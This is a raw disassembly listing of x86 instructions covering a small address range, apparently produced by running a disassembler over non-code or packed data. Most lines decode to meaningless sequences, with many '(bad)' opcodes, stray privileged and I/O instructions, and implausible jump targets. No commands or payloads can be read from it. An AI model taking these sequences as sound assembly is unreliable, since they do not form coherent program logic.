  41e3b1:	mov    cl,BYTE PTR [edi-0x2f]
  41e3b4:	dec    esi
  41e3b5:	push   ebp
  41e3b6:	cmp    eax,esi
  41e3b8:	lahf   
  41e3b9:	jmp    esi
  41e3bb:	loopne 0x41e3de
  41e3bd:	xchg   ebp,eax
  41e3be:	cli    
  41e3bf:	fist   DWORD PTR [edi]
  41e3c1:	mov    ds:0x958e17b7,eax
  41e3c6:	mov    edi,0xfb2471be
  41e3cb:	dec    ecx
  41e3cc:	and    al,0xd5
  41e3ce:	cmp    DWORD PTR [ebx],ebp
  41e3d0:	xor    DWORD PTR [ebx+0x1d],esp
  41e3d3:	add    eax,0x10e8197f
  41e3d8:	adc    eax,0x2bc6f9af
  41e3dd:	ja     0x41e432
  41e3df:	xchg   edx,eax
  41e3e0:	repnz arpl si,cx
  41e3e3:	xchg   BYTE PTR [ebx+0x1e],ah
  41e3e6:	add    al,BYTE PTR es:[ebp-0x1ff5e1f3]
	...
  41e455:	add    BYTE PTR [ecx-0xe088ee],cl
  41e45b:	jg     0x41e446
  41e45d:	xchg   esi,eax
  41e45e:	or     DWORD PTR [edx+0x18],0x7a810709
  41e465:	jne    0x41e460
  41e467:	inc    esp
  41e468:	add    DWORD PTR [eax],eax
  41e46a:	inc    DWORD PTR [eax]
  41e46c:	add    BYTE PTR [eax],al
  41e46e:	mov    eax,ds:0x68b9e837
  41e473:	push   ds
  41e474:	mov    ss,WORD PTR [edx]
  41e476:	(bad)
  41e479:	push   ebx
  41e47a:	inc    esi
  41e47b:	jmp    0x1012f5d0
  41e480:	cmp    ch,BYTE PTR [esi+edx*4-0x35b4c246]
  41e487:	test   al,0xb4
  41e489:	repz xchg ecx,eax
  41e48b:	loope  0x41e4e6
  41e48d:	sahf   
  41e48e:	cld    
  41e48f:	add    al,0x3
  41e491:	and    edi,DWORD PTR [esp+eiz*4]
  41e494:	mov    eax,0xaae187d8
  41e499:	js     0x41e472
  41e49b:	and    esi,esp
  41e49d:	cli    
  41e49e:	nop
  41e49f:	enter  0xfdb6,0xb2
  41e4a3:	sub    al,0xdc
  41e4a5:	in     eax,dx
  41e4a6:	in     al,0x41
  41e4a8:	adc    eax,0xb0f362a0
  41e4ad:	nop
  41e4ae:	in     eax,0xa8
  41e4b0:	ja     0x41e4d8
  41e4b2:	jge    0x41e448
  41e4b4:	pop    eax
  41e4b5:	(bad)  
  41e4b6:	fstp   TBYTE PTR [edi+0x31]
  41e4b9:	and    al,0xfc
  41e4bb:	mov    WORD PTR [esi],es
  41e4bd:	dec    edi
  41e4be:	lock inc ecx
  41e4c0:	ss jo  0x41e46e
  41e4c3:	xchg   BYTE PTR [esi+0x4522ae5b],bh
  41e4c9:	hlt    
  41e4ca:	pusha  
  41e4cb:	(bad)  
  41e4cc:	pop    ds
  41e4cd:	push   ss
  41e4ce:	cmp    dl,bh
  41e4d0:	push   eax
  41e4d1:	cdq    
  41e4d2:	out    0xb3,al
  41e4d4:	and    eax,0x21a5b1fc
  41e4d9:	dec    edx
  41e4da:	jb     0x41e45d
  41e4dc:	data16 adc al,0xed
  41e4df:	aas    
  41e4e0:	stos   BYTE PTR es:[edi],al
  41e4e1:	or     al,BYTE PTR [eax+edi*2-0x24]
  41e4e5:	mov    dl,0x4b
  41e4e7:	fnstcw WORD PTR [edx+0x18]
  41e4ea:	jb     0x41e529
  41e4ec:	mov    edx,0x8477e8e
  41e4f1:	push   cs
  41e4f2:	daa    
  41e4f3:	sbb    bh,cl
  41e4f5:	sahf   
  41e4f6:	mov    al,ds:0xa2391c14
  41e4fb:	add    bl,bh
  41e4fd:	shl    BYTE PTR [esi],0xb5
  41e500:	pop    ss
  41e501:	rdpmc  
  41e503:	or     eax,0x2f74c881
  41e508:	mov    bl,0x58
  41e50a:	adc    al,0x99
  41e50c:	int3   
  41e50d:	mov    esi,0x618370fd
  41e512:	sub    ecx,DWORD PTR [esp+esi*1]
  41e515:	xchg   esi,eax
  41e516:	sbb    dl,BYTE PTR [ebx-0x21e1377]
  41e51c:	lock leave 
  41e51e:	fild   DWORD PTR ds:0x32bb0fa6
  41e524:	mov    bh,0x6b
  41e526:	dec    esp
  41e527:	mov    dl,0xb7
  41e529:	push   edi
  41e52a:	test   al,0x3a
  41e52c:	adc    eax,0xeb002657
  41e531:	or     ebx,DWORD PTR [ebx]
  41e533:	(bad)  [esi+0x5d]
  41e536:	push   cs
  41e537:	test   al,0xb6
  41e539:	or     eax,0x711c28e9
  41e53e:	pop    edx
  41e53f:	mov    eax,ds:0x302daf13
  41e544:	div    BYTE PTR [ebp+0x78]
  41e547:	clc    
  41e548:	mov    DWORD PTR [esi+ecx*2-0x33d9f57],eax
  41e54f:	lods   eax,DWORD PTR ds:[esi]
  41e550:	adc    eax,0x4e0d209a
  41e555:	popf   
  41e556:	scas   eax,DWORD PTR es:[edi]
  41e557:	dec    edi
  41e558:	or     cl,ah
  41e55a:	fbld   TBYTE PTR [esi-0x71e4f544]
  41e560:	test   al,0x33
  41e562:	ret    0xc825
  41e565:	iret   
  41e566:	ret    0x585b
  41e569:	into   
  41e56a:	jno    0x41e53a
  41e56c:	ret    0x0
	...
  41e5d3:	add    BYTE PTR [eax],al
  41e5d5:	add    BYTE PTR [eax],ah
  41e5d7:	push   0xffffffcb
  41e5d9:	dec    ebx
  41e5da:	retf   
  41e5db:	jmp    0x41e57d
  41e5dd:	imul   ebp,ebx,0xffffffb1
  41e5e0:	aaa    
  41e5e1:	je     0x41e5b3
  41e5e3:	fs (bad) 
  41e5e5:	mov    ecx,0x145f8
  41e5ea:	inc    DWORD PTR [eax]
  41e5ec:	add    BYTE PTR [eax],al
  41e5ee:	nop
  41e5ef:	(bad)  
  41e5f0:	mov    bl,0x33
  41e5f2:	jbe    0x41e613
  41e5f4:	jge    0x41e5dd
  41e5f6:	inc    eax
  41e5f7:	call   0x47042ba1
  41e5fc:	sub    al,0xe1
  41e5fe:	sub    bl,BYTE PTR [ecx]
  41e600:	sbb    dl,bh
  41e602:	nop
  41e603:	inc    esp
  41e604:	adc    eax,0x6b26fd6d
  41e609:	xchg   ebp,eax
  41e60a:	es and al,0x9d
  41e60d:	adc    BYTE PTR [edx],bh
  41e60f:	daa    
  41e610:	sbb    eax,eax
  41e612:	(bad)  
  41e614:	add    bl,0xa0
  41e617:	adc    eax,0x1440482e
  41e61c:	lahf   
  41e61d:	lahf   
  41e61e:	adc    BYTE PTR [esi+0x3ea975ae],ch
  41e624:	into   
  41e625:	imul   DWORD PTR [esi+0x1346866e]
  41e62b:	mov    cl,0x9c
  41e62d:	jp     0x41e619
  41e62f:	ret    
  41e630:	xor    BYTE PTR [ebx-0x301cfa0e],0xbb
  41e637:	sbb    DWORD PTR [ecx],esp
  41e639:	jae    0x41e5fc
  41e63b:	add    eax,0x29ca219b
  41e640:	call   0xe5dcf81a
  41e645:	clc    
  41e646:	jnp    0x41e690
  41e648:	pop    ebx
  41e649:	inc    ebx
  41e64a:	pop    ds
  41e64b:	adc    ecx,DWORD PTR [ebx+ebp*8+0x3bda680d]
  41e652:	sar    DWORD PTR ss:[ebx+eax*2],cl
  41e656:	mov    cl,0x38
  41e658:	xchg   edi,eax
  41e659:	int    0x32
  41e65b:	pop    ebx
  41e65c:	fst    QWORD PTR [ecx]
  41e65e:	cmp    esi,edx
  41e660:	mov    esi,0xba4f39f9
  41e665:	in     eax,0xd6
  41e667:	xchg   ecx,eax
  41e668:	sub    edx,edi
  41e66a:	mov    ah,0xb9
  41e66c:	push   ss
  41e66d:	xchg   edx,edi
  41e66f:	fild   DWORD PTR [edx]
  41e671:	stos   BYTE PTR es:[edi],al
  41e672:	outs   dx,DWORD PTR ds:[esi]
  41e673:	outs   dx,DWORD PTR ds:[esi]
  41e674:	mov    dl,0xa
  41e676:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e677:	in     eax,0x66
  41e679:	jmp    0x41e6ec
  41e67b:	push   eax
  41e67c:	adc    edi,DWORD PTR [esi-0x42]
  41e67f:	push   esi
  41e680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e681:	mov    cl,0x6
  41e683:	lea    eax,[ebp+eiz*2-0x2241bbcd]
  41e68a:	and    eax,0x29616f38
  41e68f:	pushf  
  41e690:	mov    ecx,fs
  41e692:	push   ss
  41e693:	and    al,0x1f
  41e695:	pop    ss
  41e696:	xchg   edi,eax
  41e697:	(bad)  
  41e698:	fild   DWORD PTR [eax+0x2f]
  41e69b:	scas   al,BYTE PTR es:[edi]
  41e69c:	cmp    al,0xa
  41e69e:	fist   DWORD PTR ds:[ebp+0x47]
  41e6a2:	sub    ch,BYTE PTR [eax+0x31]
  41e6a5:	shl    esp,0x36
  41e6a8:	aaa    
  41e6a9:	add    eax,0xdaf1ff9f
  41e6ae:	sbb    DWORD PTR [edi+0x76],ecx
  41e6b1:	cmp    ecx,ebx
  41e6b3:	or     DWORD PTR [eax],esp
  41e6b5:	add    eax,0xee4e5ec6
  41e6ba:	xchg   ecx,eax
  41e6bb:	rcr    BYTE PTR [ebx-0x3b44c4c1],cl
  41e6c1:	and    edi,edx
  41e6c3:	cmp    BYTE PTR [edx-0x5b],dl
  41e6c6:	dec    ebx
  41e6c7:	or     ah,dl
  41e6c9:	xor    esp,DWORD PTR [esi+0x6d21b918]
  41e6cf:	sub    al,0x8b
  41e6d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6d2:	adc    DWORD PTR [ebp-0x11],ebx
  41e6d5:	cmp    cl,al
  41e6d7:	adc    eax,0xd1890ca4
  41e6dc:	inc    eax
  41e6dd:	cmp    dl,0x91
  41e6e0:	push   esp
  41e6e1:	pop    ecx
  41e6e2:	jbe    0x41e6dd
  41e6e4:	cli    
  41e6e5:	mov    bh,0xed
  41e6e7:	shl    BYTE PTR [ebx+0x67],1
  41e6ea:	mov    ch,0x27
  41e6ec:	sub    DWORD PTR [eax],eax
	...
  41e756:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e75c:	cmc    
  41e75d:	cwde   
  41e75e:	xchg   esp,eax
  41e75f:	push   0x37
  41e761:	sub    eax,DWORD PTR [ecx]
  41e763:	push   DWORD PTR [esi]
  41e765:	xor    bh,dh
  41e767:	inc    esi
  41e768:	add    DWORD PTR [eax],eax
  41e76a:	inc    DWORD PTR [eax]
  41e76c:	add    BYTE PTR [eax],al
  41e76e:	fsubp  st(2),st
  41e770:	in     eax,dx
  41e771:	ss gs into 
  41e774:	jge    0x41e7a7
  41e776:	push   edx
  41e777:	ins    DWORD PTR es:[edi],dx
  41e778:	push   0xb16baca8
  41e77d:	mov    eax,ds:0x2be4dac9
  41e782:	icebp  
  41e783:	sbb    ecx,DWORD PTR [edx-0x4a]
  41e786:	(bad)  
  41e787:	jb     0x41e76f
  41e789:	or     edx,ecx
  41e78b:	sbb    DWORD PTR [eax+0x7c],edi
  41e78e:	inc    esp
  41e78f:	cdq    
  41e790:	cmp    al,0x10
  41e792:	mov    eax,edx
  41e794:	dec    ebx
  41e795:	mov    al,0x3c
  41e797:	mov    eax,fs
  41e799:	sbb    eax,0xb7931ef0
  41e79e:	(bad)  
  41e79f:	(bad)  
  41e7a0:	jmp    DWORD PTR [edx+ebx*2]
  41e7a3:	add    DWORD PTR [esi+0x40],esi
  41e7a6:	call   0xb8ac:0x8f2e3c7c
  41e7ad:	rol    DWORD PTR fs:[edx],0x87
  41e7b1:	scas   al,BYTE PTR es:[edi]
  41e7b2:	sahf   
  41e7b3:	or     eax,0xd398a18d
  41e7b8:	mov    edi,0x95f55cd0
  41e7bd:	into   
  41e7be:	pop    esp
  41e7bf:	mov    dh,0xa1
  41e7c1:	add    DWORD PTR [edx],edx
  41e7c3:	xchg   edx,eax
  41e7c4:	pop    ds
  41e7c5:	or     bl,bl
  41e7c7:	(bad)  
  41e7c8:	xlat   BYTE PTR ds:[ebx]
  41e7c9:	mov    bh,0x4b
  41e7cb:	imul   eax,edx,0x2f
  41e7ce:	push   es
  41e7cf:	outs   dx,BYTE PTR ds:[esi]
  41e7d0:	(bad)  
  41e7d1:	loopne 0x41e82e
  41e7d3:	bnd jge 0x41e846
  41e7d6:	hlt    
  41e7d7:	dec    ebp
  41e7d8:	(bad)  
  41e7d9:	dec    esi
  41e7da:	js     0x41e7db
  41e7dc:	int3   
  41e7dd:	je     0x41e7c1
  41e7df:	mov    ds:0xc111d67e,eax
  41e7e4:	mov    dh,BYTE PTR [edi]
  41e7e6:	or     eax,0xafa3692
  41e7eb:	add    dh,BYTE PTR [esi-0x10]
  41e7ee:	xchg   edi,eax
  41e7ef:	push   0x62
  41e7f1:	sbb    al,0xc3
  41e7f3:	rcl    DWORD PTR [ecx],cl
  41e7f5:	push   eax
  41e7f6:	mov    DWORD PTR [edx+eax*2],eax
  41e7f9:	cmp    eax,0x896383c6
  41e7fe:	(bad)  
  41e7ff:	mov    eax,ds:0xbabde43f
  41e804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e805:	clc    
  41e806:	jne    0x41e79a
  41e808:	repz fucomi st,st(2)
  41e80b:	out    dx,al
  41e80c:	xchg   DWORD PTR [edi+0x5fc77654],ebp
  41e812:	pop    edx
  41e813:	scas   eax,DWORD PTR es:[edi]
  41e814:	(bad)  
  41e815:	outs   dx,BYTE PTR ds:[esi]
  41e816:	scas   al,BYTE PTR es:[edi]
  41e817:	int    0x77
  41e819:	(bad)  
  41e81a:	scas   al,BYTE PTR es:[edi]
  41e81b:	test   eax,0xb7297345
  41e820:	retf   0x1c93
  41e823:	or     eax,0x168b6e3a
  41e828:	mov    bl,0xb8
  41e82a:	ds fwait
  41e82c:	sub    ecx,esi
  41e82e:	add    eax,0x91182c10
  41e833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e834:	adc    bh,dh
  41e836:	fiadd  WORD PTR [eax+0x4b]
  41e839:	in     eax,0x3c
  41e83b:	push   ecx
  41e83c:	sahf   
  41e83d:	cmp    DWORD PTR [ebp-0x28],ebx
  41e840:	frstor [edx+0x1a8a65cb]
  41e846:	dec    edi
  41e847:	imul   ecx,esp,0xf89624d5
  41e84d:	mov    bh,0xd4
  41e84f:	(bad)  
  41e850:	fsub   DWORD PTR [ebp-0x14]
  41e853:	mov    ds:0xc127eefc,eax
  41e858:	push   cs
  41e859:	les    ebp,FWORD PTR [edx-0x3eaf76df]
  41e85f:	in     al,0x54
  41e861:	(bad)  
  41e862:	jne    0x41e8b7
  41e864:	inc    edx
  41e865:	dec    esi
  41e866:	push   cs
  41e867:	test   al,0xc5
  41e86a:	loopne 0x41e8db
  41e86c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  41e8d5:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e8db:	(bad)  
  41e8dc:	(bad)  
  41e8dd:	jns    0x41e94e
  41e8df:	xor    al,0xcc
  41e8e1:	jg     0x41e8d3
  41e8e3:	add    eax,0x47f6c051
  41e8e8:	add    DWORD PTR [eax],eax
  41e8ea:	inc    DWORD PTR [eax]
  41e8ec:	add    BYTE PTR [eax],al
  41e8ee:	clc    
  41e8ef:	jmp    0x88725f64
  41e8f4:	jnp    0x41e8b1
  41e8f6:	inc    edx
  41e8f7:	rol    dl,1
  41e8f9:	nop
  41e8fa:	push   0xfffffffe
  41e8fc:	int3   
  41e8fd:	add    al,0xf5
  41e8ff:	test   eax,0xbcba9be
  41e904:	xor    eax,0x3e47cfe2
  41e909:	dec    esp
  41e90a:	mov    al,ds:0x48fe33a9
  41e90f:	mov    BYTE PTR [esi-0x186fa9ca],ah
  41e915:	adc    DWORD PTR [ebx+0x56],eax
  41e918:	adc    al,0xc7
  41e91a:	and    bh,BYTE PTR [eax]
  41e91c:	mov    dh,0x1f
  41e91e:	jle    0x41e8e3
  41e920:	sti    
  41e921:	stos   BYTE PTR es:[edi],al
  41e922:	into   
  41e923:	mov    esp,0x7849db8
  41e928:	sbb    ch,BYTE PTR [edi-0xd1a2aec]
  41e92e:	cwde   
  41e92f:	mov    esp,0x17e4fe6
  41e934:	out    0x7f,al
  41e936:	rcl    DWORD PTR [eax-0x4f9a11b3],0xbc
  41e93d:	nop
  41e93e:	inc    edi
  41e93f:	out    0x67,al
  41e941:	or     DWORD PTR [edi+0x27952760],edx
  41e947:	push   eax
  41e948:	repz add eax,0x2fcce4f2
  41e94e:	pop    esi
  41e94f:	retf   0x33f5
  41e952:	and    DWORD PTR [edi],edx
  41e954:	fisub  DWORD PTR ds:0xae68e64f
  41e95a:	jo     0x41e995
  41e95c:	jne    0x41e8fa
  41e95e:	and    ebx,edx
  41e960:	xor    al,0x6f
  41e962:	or     dh,BYTE PTR [edx-0x41]
  41e965:	arpl   WORD PTR [eax+0x4a2ddbd8],bp
  41e96b:	push   ebx
  41e96c:	mov    al,0x30
  41e96e:	and    DWORD PTR [esi+edi*8-0x18],esi
  41e972:	bound  esi,QWORD PTR [edx]
  41e974:	in     al,dx
  41e975:	popa   
  41e976:	popa   
  41e977:	test   ebp,0x995dd9ba
  41e97d:	inc    esi
  41e97e:	(bad)  
  41e97f:	nop
  41e980:	into   
  41e981:	int3   
  41e982:	jl     0x41e9bb
  41e984:	ffree  st(2)
  41e986:	retf   0x69e5
  41e989:	(bad)  
  41e98a:	into   
  41e98b:	and    al,0x92
  41e98d:	das    
  41e98e:	add    esp,DWORD PTR [ebp-0x2]
  41e991:	xor    eax,0x4a271931
  41e996:	push   eax
  41e997:	int3   
  41e998:	push   esp
  41e999:	loopne 0x41e9b5
  41e99b:	hlt    
  41e99c:	(bad)  
  41e99d:	lods   al,BYTE PTR ds:[esi]
  41e99e:	call   FWORD PTR [edx]
  41e9a0:	cli    
  41e9a1:	push   ds
  41e9a2:	(bad)  
  41e9a3:	popa   
  41e9a4:	jo     0x41e98c
  41e9a6:	xchg   ebx,eax
  41e9a7:	cmp    al,0xc8
  41e9a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9aa:	pop    es
  41e9ab:	dec    esp
  41e9ac:	out    dx,al
  41e9ad:	push   ebp
  41e9ae:	sti    
  41e9af:	pop    ecx
  41e9b0:	or     BYTE PTR [edx+0x1911a08a],dl
  41e9b6:	mov    eax,0xb75e6779
  41e9bb:	push   esi
  41e9bc:	xchg   esp,eax
  41e9bd:	enter  0x493d,0x1c
  41e9c1:	xchg   esp,eax
  41e9c2:	fwait
  41e9c3:	sub    bh,BYTE PTR [ecx+0x3b]
  41e9c6:	jo     0x41e999
  41e9c8:	mov    cl,0x63
  41e9ca:	and    al,0x5b
  41e9cc:	xchg   edi,eax
  41e9cd:	xchg   edx,eax
  41e9ce:	fimul  WORD PTR [ecx+0x454ce5b6]
  41e9d4:	pop    edi
  41e9d5:	cmp    ah,bl
  41e9d7:	jns    0x41e9a9
  41e9d9:	xlat   BYTE PTR ds:[ebx]
  41e9da:	push   es
  41e9db:	inc    esp
  41e9dc:	in     al,dx
  41e9dd:	enter  0x463d,0x72
  41e9e1:	cli    
  41e9e2:	xchg   ebx,eax
  41e9e3:	and    DWORD PTR [eax+esi*2+0x6f],ebx
  41e9e7:	push   edx
  41e9e8:	in     eax,0xe6
  41e9ea:	popa   
  41e9eb:	jmp    0x41e9b7
	...
  41ea55:	add    BYTE PTR [eax-0x3],bh
  41ea58:	ret    0xc766
  41ea5b:	jg     0x41ea59
  41ea5d:	dec    DWORD PTR [edi+0x67]
  41ea60:	rol    dl,1
  41ea62:	or     al,0x57
  41ea64:	mov    ds:0x148f5e6,eax
  41ea69:	add    bh,bh
  41ea6b:	add    BYTE PTR [eax],al
  41ea6d:	add    BYTE PTR [ebx-0x12],dl
  41ea70:	test   DWORD PTR [eax+0x6f2ec5e9],ecx
  41ea76:	je     0x41ea5f
  41ea78:	popa   
  41ea79:	fnstcw WORD PTR [edx+0x21]
  41ea7c:	or     DWORD PTR cs:[ebx+ebp*2-0x26],edi
  41ea81:	sub    ah,cl
  41ea83:	retf   0x523b
  41ea86:	(bad)  
  41ea88:	in     eax,0x9a
  41ea8a:	push   eax
  41ea8b:	xchg   ecx,eax
  41ea8c:	stos   DWORD PTR es:[edi],eax
  41ea8d:	pop    eax
  41ea8e:	pop    esi
  41ea8f:	mov    al,0x63
  41ea91:	push   0x77
  41ea93:	mov    ?,ebp
  41ea95:	push   ss
  41ea96:	mov    ebp,0xfb5e12ea
  41ea9b:	xchg   BYTE PTR [edi],ah
  41ea9d:	jg     0x41eb01
  41ea9f:	xor    DWORD PTR [ebp+0x2209a239],eax
  41eaa5:	jno    0x41ea34
  41eaa7:	jo     0x41ea2e
  41eaa9:	cmp    ebp,DWORD PTR [ecx+0x1aa90adc]
  41eaaf:	pop    esp
  41eab0:	lods   al,BYTE PTR ds:[esi]
  41eab1:	rcr    BYTE PTR ds:0xf6291300,cl
  41eab7:	jl     0x41ea56
  41eab9:	sar    DWORD PTR [edx-0x567af192],0x1
  41eac0:	fsub   QWORD PTR [edx-0x10]
  41eac3:	js     0x41eb06
  41eac5:	loopne 0x41eb3f
  41eac7:	call   0xe858b342
  41eacc:	and    al,0x9e
  41eace:	cmp    BYTE PTR [edi],al
  41ead0:	test   edi,ebp
  41ead2:	out    0x2a,al
  41ead4:	xor    DWORD PTR [ecx],ecx
  41ead6:	jle    0x41ea9d
  41ead8:	pushf  
  41ead9:	mov    ds:0x93591b80,eax
  41eade:	pop    ds
  41eadf:	ds mov ecx,0x1d37dd60
  41eae5:	fstp   TBYTE PTR [edx-0x25]
  41eae8:	xchg   DWORD PTR [edi-0x39],esp
  41eaeb:	pop    edx
  41eaec:	mov    dl,0x46
  41eaee:	repz fiadd DWORD PTR ds:[ecx-0x2f72a2cb]
  41eaf6:	sahf   
  41eaf7:	mov    ebp,0x4aded85
  41eafc:	mov    cs,WORD PTR [ebx-0x2b24d560]
  41eb02:	cs sbb eax,0xefe2b616
  41eb08:	or     DWORD PTR ds:0x1d94731a,edi
  41eb0e:	fcmovbe st,st(4)
  41eb10:	nop
  41eb11:	ficom  DWORD PTR [edi+0x62ee0c40]
  41eb17:	(bad)  
  41eb18:	iret   
  41eb19:	sub    DWORD PTR [esi],esp
  41eb1b:	add    BYTE PTR [ebx-0x8d96b18],0x63
  41eb22:	inc    edi
  41eb23:	push   esi
  41eb24:	pop    ebp
  41eb25:	mul    DWORD PTR [eax+0x8882e73]
  41eb2b:	xor    ch,bl
  41eb2d:	mov    edi,esi
  41eb2f:	(bad)  
  41eb30:	push   esi
  41eb31:	pop    ss
  41eb32:	and    al,0xd7
  41eb34:	(bad)  
  41eb35:	fidivr DWORD PTR [eax+0x66]
  41eb38:	lock out 0x1e,eax
  41eb3b:	les    edi,FWORD PTR [edi-0x63737837]
  41eb41:	pop    ecx
  41eb42:	stos   BYTE PTR es:[edi],al
  41eb43:	nop
  41eb44:	mov    cl,0x8f
  41eb46:	mov    ch,0x8e
  41eb48:	push   ss
  41eb49:	cli    
  41eb4a:	neg    edx
  41eb4c:	xor    DWORD PTR [edx-0x16],ebp
  41eb4f:	dec    esi
  41eb50:	in     al,dx
  41eb51:	test   eax,0x43f25a02
  41eb56:	and    al,0xda
  41eb58:	clc    
  41eb59:	mov    dl,0x85
  41eb5b:	jo     0x41eae2
  41eb5d:	push   ss
  41eb5e:	fsubr  st(6),st
  41eb60:	or     DWORD PTR [edx],ecx
  41eb62:	mov    BYTE PTR [ecx-0x55e6c472],0x96
  41eb69:	sar    ebp,0xee
  41eb6c:	add    BYTE PTR es:[eax],al
	...
  41ebd3:	add    BYTE PTR [eax],al
  41ebd5:	add    BYTE PTR [edx],dl
  41ebd7:	das    
  41ebd8:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41ebdf:	out    0x9b,al
  41ebe1:	aad    0x4
  41ebe3:	stos   BYTE PTR es:[edi],al
  41ebe4:	or     ebx,DWORD PTR [ebx]
  41ebe6:	hlt    
  41ebe7:	dec    ecx
  41ebe8:	add    DWORD PTR [eax],eax
  41ebea:	inc    DWORD PTR [eax]
  41ebec:	add    BYTE PTR [eax],al
  41ebee:	lock inc edi
  41ebf0:	inc    eax
  41ebf1:	sbb    al,0x91
  41ebf3:	sub    cl,BYTE PTR ds:0x6833a44b
  41ebf9:	inc    ebp
  41ebfa:	(bad)  
  41ebfb:	jo     0x41ec0e
  41ebfd:	cmp    DWORD PTR [edi-0x398dbea1],0xfffffff6
  41ec04:	mov    bh,BYTE PTR [ebp+0x1a817f28]
  41ec0a:	fisubr DWORD PTR ds:0x9c3911a5
  41ec10:	dec    ebp
  41ec11:	sbb    DWORD PTR [ebp+esi*2+0x71],ecx
  41ec15:	out    0xb,al
  41ec17:	xchg   ebx,eax
  41ec18:	pop    esp
  41ec19:	mov    ch,0x5b
  41ec1b:	sub    eax,0xd4d484cb
  41ec20:	pop    ebp
  41ec21:	and    edi,DWORD PTR [edi+0x12bafdcd]
  41ec27:	repz sbb bh,BYTE PTR [eax-0xf]
  41ec2b:	rol    DWORD PTR [ecx-0x69],1
  41ec2e:	xchg   ecx,eax
  41ec2f:	popa   
  41ec30:	btc    DWORD PTR [esi+0x48],esi
  41ec34:	imul   ecx,DWORD PTR [edi-0x66ae3284],0xffffffb7
  41ec3b:	xor    ebx,esi
  41ec3d:	mov    ds:0xe96bd9d,al
  41ec42:	jg     0x41ec2a
  41ec44:	pop    ss
  41ec45:	push   edx
  41ec46:	mov    bh,0x73
  41ec48:	cs inc ecx
  41ec4a:	lahf   
  41ec4b:	push   eax
  41ec4c:	xchg   edx,eax
  41ec4d:	jecxz  0x41ec96
  41ec4f:	add    ebx,DWORD PTR [ebx-0x6c172b95]
  41ec55:	or     dh,0x9d
  41ec58:	jne    0x41ebf7
  41ec5a:	mov    ch,0x14
  41ec5c:	dec    ebp
  41ec5d:	add    bh,cl
  41ec5f:	pushf  
  41ec60:	xor    eax,0x9204eaf4
  41ec65:	out    0x30,eax
  41ec67:	pop    ebx
  41ec68:	mov    WORD PTR [ebp-0x438c66d2],ss
  41ec6e:	gs mov bl,0x3a
  41ec71:	add    BYTE PTR [ebx],0x2d
  41ec74:	push   eax
  41ec75:	std    
  41ec76:	or     BYTE PTR [eax+0x42],ch
  41ec79:	aad    0xab
  41ec7b:	xor    ebx,DWORD PTR [ecx-0xe]
  41ec7e:	xchg   esp,eax
  41ec7f:	push   ds
  41ec80:	lods   al,BYTE PTR ds:[esi]
  41ec81:	rcr    DWORD PTR [ebp-0x589944d0],0xa6
  41ec88:	sbb    al,0x56
  41ec8a:	shl    ecx,cl
  41ec8c:	cmp    eax,DWORD PTR [ebx]
  41ec8e:	clc    
  41ec8f:	pop    ecx
  41ec90:	inc    ebp
  41ec91:	pop    ebx
  41ec92:	daa    
  41ec93:	imul   DWORD PTR [eax]
  41ec95:	and    bh,al
  41ec97:	push   ecx
  41ec98:	(bad)  
  41ec99:	adc    DWORD PTR [edi-0x1f],edx
  41ec9c:	cmc    
  41ec9d:	inc    esp
  41ec9e:	sbb    eax,0x37485b8a
  41eca3:	xor    bl,0x68
  41eca6:	jmp    0x9c38:0x89a9ac38
  41ecad:	inc    ebp
  41ecae:	jge    0x41ec5c
  41ecb0:	mov    ebp,0x9881830e
  41ecb5:	adc    DWORD PTR [ecx+0x36],ebx
  41ecb8:	inc    ebx
  41ecb9:	stos   DWORD PTR es:[edi],eax
  41ecba:	jo     0x41ecfe
  41ecbc:	cmp    BYTE PTR [ebx+eiz*1+0x64],dl
  41ecc0:	add    dh,cl
  41ecc2:	mov    eax,0x26ea50ec
  41ecc7:	mov    edi,0x91562b3c
  41eccc:	push   ecx
  41eccd:	and    eax,0x6617a91b
  41ecd2:	rol    BYTE PTR [ecx+0x69dba450],0x36
  41ecd9:	adc    eax,0x8155bda
  41ecde:	jge    0x41ec91
  41ece0:	inc    ecx
  41ece1:	push   ss
  41ece2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ece3:	sub    dl,BYTE PTR [edx+0x65]
  41ece6:	fldcw  WORD PTR [edx-0x80]
  41ece9:	cmc    
  41ecea:	data16 jmp 0x41ecab
	...
  41ed55:	add    BYTE PTR [ecx-0xf],al
  41ed58:	(bad)
  41ed5b:	hlt    
  41ed5c:	gs icebp 
  41ed5e:	dec    edi
  41ed5f:	adc    eax,0xe09b5fd0
  41ed64:	xlat   BYTE PTR ds:[ebx]
  41ed65:	scas   eax,DWORD PTR es:[edi]
  41ed66:	repz dec edx
  41ed68:	add    DWORD PTR [eax],eax
  41ed6a:	inc    DWORD PTR [eax]
  41ed6c:	add    BYTE PTR [eax],al
  41ed6e:	lahf   
  41ed6f:	(bad)
  41ed72:	cld    
  41ed73:	lahf   
  41ed74:	or     bl,BYTE PTR [edx+edi*8-0x61]
  41ed78:	and    cl,BYTE PTR [ebx]
  41ed7a:	outs   dx,DWORD PTR ds:[esi]
  41ed7b:	cdq    
  41ed7c:	dec    ebp
  41ed7d:	push   edi
  41ed7e:	loop   0x41ed27
  41ed80:	mov    cl,0x44
  41ed82:	xor    DWORD PTR ds:0x6badc44b,esp
  41ed88:	or     bh,bl
  41ed8a:	mov    al,0x9c
  41ed8c:	sub    eax,DWORD PTR cs:[ebx]
  41ed8f:	push   ebx
  41ed90:	pop    ebp
  41ed91:	fld    TBYTE PTR [ebx]
  41ed93:	lahf   
  41ed94:	mov    ds,ebx
  41ed96:	cli    
  41ed97:	add    eax,0x147a448d
  41ed9c:	loopne 0x41ed58
  41ed9e:	inc    ecx
  41ed9f:	fwait
  41eda0:	dec    ecx
  41eda1:	dec    esi
  41eda2:	test   DWORD PTR [edx-0x71e2e1e6],esi
  41eda8:	push   0xffffff92
  41edaa:	sar    DWORD PTR [edi+0x5b],1
  41edad:	ds sbb al,0x4c
  41edb0:	xchg   ebx,eax
  41edb1:	adc    eax,0x95314202
